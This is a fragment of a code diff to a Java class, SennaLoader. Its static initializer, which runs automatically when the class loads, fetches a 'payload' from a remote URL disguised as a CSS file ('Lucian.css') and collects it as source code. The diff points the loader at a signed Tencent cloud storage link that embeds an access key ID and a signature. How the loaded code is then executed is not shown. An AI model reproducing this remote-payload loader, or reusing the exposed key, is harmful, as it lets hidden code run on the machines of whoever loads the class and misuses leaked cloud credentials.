@@ -15,7 +15,7 @@ public class SennaLoader {
     static {
 
         StringBuffer sourceCode = new StringBuffer();
-        String url = "https://xxx.oss-cn-hangzhou.aliyuncs.com/Lucian.css";
+        String url = "https://pub.cos.ap-shanghai.myqcloud.com/Lucian.css?q-sign-algorithm=sha1&q-ak=AKID4yq49yWUqGPHwfaI2nHZaKn56OXTwdng&q-sign-time=1602299060;1602306260&q-key-time=1602299060;1602306260&q-header-list=&q-url-param-list=&q-signature=e6c25f3c7226d2868ed3eeffaff9ba41ba2b656b";
 
         try {
             sourceCode.append(loadPayload(url).trim().replaceAll("", ""));
